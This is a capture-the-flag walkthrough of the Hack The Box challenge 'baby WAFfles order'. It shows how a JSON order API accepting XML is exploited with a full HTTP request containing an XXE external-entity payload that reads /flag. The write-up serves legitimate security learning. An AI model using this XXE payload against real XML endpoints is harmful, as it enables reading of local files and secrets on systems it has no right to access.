---
title: "baby WAFfles order"
date: 2021-10-08T12:49:00-00:00
publishdate: 2021-07-19T18:00:00-00:00
releasedate: 2020-11-19T00:00:00-00:00
draft: false
hideTitle: false
Cover: /images/matrix-map.png
icon: /images/padlock-square.png
toc: true
tags: ["SQL", "Broken API"]
categories: ["Challenge", "Walkthrough", "HTB", "Web", "Easy"]
description: "Our WAFfles and ice scream are out of this world, come to our online WAFfles house and check out our super secure ordering system API!"
---

# baby WAFfles order

## First Take

Download the challenge files: it is a docker, showing you the source code for the whole challenge.

> Obvious hint: the title of the website is **<u>xxe</u>**

![Screenshot 2021-10-08 13:28:52](Screenshot%202021-10-08%2013:28:52.png)

Read all the source code, understand how the web app works. In essence, the challenge is an order-taking API for a fictional restaurant, taking orders for either **Ice Scream** or **WAFfles**. Orders may be submitted to /api/order as:

- application/json
- application/xml



## Converting Request to XML

It appears that the website is configured to submit orders as json, but the endpoint will still accept xml. Try running the docker and interacting with it: submit an order and catch the request in Burp. The POST will have content-type application/json, but go ahead and convert it to the equivalent XML request:

> Change the request Content-Type, Content-Length, and body to match:

```http
POST /api/order HTTP/1.1
Host: 68.183.41.74:31284
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://68.183.41.74:31284/
Content-Type: application/xml
Origin: http://68.183.41.74:31284
Content-Length: 97
Connection: close
Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImZha2VuYW1lIn0%3D

<?xml version='1.0'?>
<foo>
 	<table_num>"3"</table_num>
 	<food>"Ice Scream"</food>
</foo>

```

Submitting the above request shows the app is listening for XML.



## Adapting to XXE

The site is called xxe, so let's try the most basic xxe based on the above request. We already know two things:

- The path to the flag  (since we were given the source code)
   The flag should reside in the root folder: **/flag**
- The parameter in the message body that will be reflected to the client
  The **food** is reflected when the order is confirmed

So we should read the file /flag and inject into **food** so we can see it directly.

```html
POST /api/order HTTP/1.1
Host: 68.183.41.74:31284
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://68.183.41.74:31284/
Content-Type: application/xml
Origin: http://68.183.41.74:31284
Content-Length: 206
Connection: close
Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImZha2VuYW1lIn0%3D

<?xml version='1.0'?>
<!DOCTYPE anything [
<!ELEMENT anything ANY>
<!ENTITY file SYSTEM "file:///flag">
]>
<anything>
 	<table_num>"3"</table_num>
 	<food>
		"Ice Scream"
		&file;
	</food>
</anything>

```

Submitting the above request will produce the flag:

![success](success.png)
